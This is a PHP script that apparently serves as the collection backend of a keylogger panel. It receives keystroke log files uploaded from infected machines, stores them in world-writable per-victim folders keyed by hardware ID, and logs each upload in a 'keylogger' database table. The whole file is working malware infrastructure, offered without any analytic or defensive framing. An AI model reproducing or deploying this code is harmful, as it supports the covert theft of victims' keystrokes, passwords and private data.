<?php
error_reporting(0);
include("config.php");

function safe_id($data){

  $data =  trim($data);
  $data =  strip_tags($data);
  $data =  htmlspecialchars($data);
  $data =  addslashes($data);
  
  return $data;
}

$hwid = $_GET['hwid'];

if(isset($hwid)) {
    
    if (!preg_match("/^[-a-zA-Z-0-9]*$/",$hwid)) {
						
      //  exit();
         
      }else{
        //$pwd = "C:/xampp/htdocs/cosanostra/upload/";
        $pwd = getcwd() . "/upload/";
        echo  $pwd;
        if (!is_dir($pwd.$hwid)) {
          mkdir($pwd.$hwid, 0777);      
        }
        $folder = "/keylogs/";
		if (!is_dir($pwd.$hwid.$folder)) {
          mkdir($pwd.$hwid.$folder, 0777);      
        }
		
        $allowed_extensions = array("txt","TXT","TxT","tXt","TXt");
        $temp = explode(".", $_FILES["file"]["name"]);
        $file_extension = end($temp);
        
        if (in_array($file_extension, $allowed_extensions)) 
        {

            $destination = "upload/$hwid/$folder" . basename($_FILES['file']['name']);
            move_uploaded_file($_FILES["file"]["tmp_name"], $destination);
             $d = date('Y/m/d h:i:s a', time());

            mysqli_query($condb,"INSERT INTO `keylogger` (`HWID`, `File_keylog`, `Keylog_date`) VALUES ('$hwid' , '$destination' ,'$d')");



        }
                                
          //echo  "allowed :)";
       

  }
    


}
					
	
							
							
?>